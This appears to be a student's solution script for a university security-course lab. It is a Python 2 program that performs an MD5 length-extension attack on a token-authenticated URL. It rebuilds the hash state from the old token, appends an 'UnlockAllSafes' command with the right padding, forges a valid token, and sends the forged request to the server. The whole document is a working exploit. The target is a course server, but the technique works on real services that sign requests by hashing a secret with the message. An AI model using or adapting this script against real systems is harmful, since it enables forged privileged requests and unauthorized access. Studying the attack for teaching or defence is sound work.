import httplib, urlparse, sys, urllib; from pymd5 import md5, padding

url = sys.argv[1] 
#"https://eecs388.org/project1/api?token=790dff3aeaa6f97cdf470b347464e91a&user=admin&command1=ListFiles&command2=NoOp"

# The password length is given as 8
pwLen = 8

# Split the URL at the hostname delimiter,
# the result is a list of two substrings:
# the hostname and everything else
fstSplit = url.split("=", 1)

# Split the token from the rest of the message
sndSplit = fstSplit[1].split("&", 1)

# The old hash needed for exploiting the system
old_hash = sndSplit[0]

# sndSplit[1] = user=admin&command1=...
m_len = pwLen + len(sndSplit[1])

# Needed for proper MD5 initialization
bits = (m_len + len(padding(m_len * 8))) * 8

h = md5(state = old_hash.decode("hex"), count = bits)

x = "&command3=UnlockAllSafes"
h.update(x)
new_token = h.hexdigest()

# We need the padding of the old hash 
# in order to properly line up our new message
pad = urllib.quote(padding(m_len * 8))

url = fstSplit[0] + "=" + new_token + "&" + sndSplit[1] + pad + x

parsedUrl = urlparse.urlparse(url)
conn = httplib.HTTPConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()